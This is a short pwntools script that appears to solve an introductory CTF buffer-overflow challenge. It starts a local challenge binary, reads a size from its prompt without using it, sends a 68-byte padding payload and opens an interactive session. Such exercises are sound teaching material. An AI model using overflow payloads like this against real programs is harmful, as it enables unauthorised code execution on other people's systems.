from pwn import *

r = process('/challenge/binary-exploitation-first-overflow')

size = r.recvline_contains('Send your').decode().split(' ')[5]
size = int(size)

payload = (68) * b'A'

r.sendline(payload)
r.interactive()